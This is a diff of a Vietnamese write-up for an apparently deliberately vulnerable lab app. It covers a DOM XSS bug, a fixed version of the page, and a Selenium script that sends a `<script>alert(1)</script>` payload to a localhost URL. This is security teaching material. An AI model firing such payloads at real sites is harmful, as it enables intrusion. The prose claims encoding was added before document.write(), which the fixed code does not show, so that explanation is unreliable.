@@ -326,22 +326,83 @@ Script sử dụng Selenium để tự động gửi payload XSS vào 2 trườn
 </html>
 ```
 
-Dữ liệu lấy từ URL query string: `location.search`, attacker kiểm soát hoàn toàn input
-trích xuất tham số
-if (lang.indexOf("book=") >= 0) {
-    var res = lang.substring(lang.indexOf("book=") + 5);
-}
-Cắt trực tiếp chuỗi từ book=
-Không validate input
-Không encode
-3. Sink gây XSS
-document.write("<option value='" + res + "'>" + res + "</option>");
+Dữ liệu lấy từ URL query string: `location.search` mà không validate input,không encode nên attacker kiểm soát hoàn toàn input.
 
-Đây là dangerous sink vì:
+- Cách khắc phục
 
-inject HTML trực tiếp vào DOM
-không escape ký tự đặc biệt như:
-<
->
-'
-"
+```
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>DOM XSS (Fixed Style)</title>
+        <link rel="stylesheet" href="../../../assets/css/style.css">
+    </head>
+
+    <body>
+        <?php require_once "../../../includes/sidebar.php"; ?>
+        <div class="content">
+            <h1>DOM XSS</h1>
+            <h2>Hãy chọn sách bạn muốn</h2>
+            <form name="allbook" method="GET">
+                <select name="book" id="book-select">
+                    <option value="Foxie">Foxie</option>
+                    <option value="Pophello">Pophello</option>
+                    <option value="Naru">Naru</option>
+                </select>
+                <input type="submit" style="margin-top: 20px;" value="Chọn">
+            </form>
+
+            <div id="output" style="margin-top: 20px;"></div>
+
+            <script>
+                const urlParams = new URLSearchParams(window.location.search);
+                const bookParam = urlParams.get('book');
+                const selectElement = document.getElementById("book-select");
+
+                if (bookParam) {
+                    const newOption = document.createElement("option");
+                    newOption.value = bookParam;
+                    newOption.text = bookParam;
+                    newOption.selected = true;
+                    selectElement.insertBefore(newOption, selectElement.firstChild);
+                } else {
+                    const defaultOption = document.createElement("option");
+                    defaultOption.value = "OhMyCrab";
+                    defaultOption.text = "OhMyCrab";
+                    defaultOption.selected = true;
+                    selectElement.insertBefore(defaultOption, selectElement.firstChild);
+                }
+            </script>
+        </div>
+        <div class="content">
+            <button>
+                <a href="/OhMyCrab/modules/xss/dom.php">
+                    Back To Vulnerable
+                </a>
+            </button>
+        </div>
+    </body>
+</html>
+```
+
+Mã nguồn được thêm hàm xử lý dữ liệu đầu vào để mã hóa các ký tự đặc biệt trước khi đưa vào hàm thực thi document.write().
+
+- Script khai thác
+
+```
+from selenium import webdriver
+import time
+
+payload = "<script>alert(1)</script>"
+
+url = f"http://127.0.0.1/OhMyCrab/modules/xss/dom.php?book={payload}"
+
+driver = webdriver.Chrome()
+
+driver.get(url)
+
+time.sleep(20)
+
+driver.quit()
+```
+
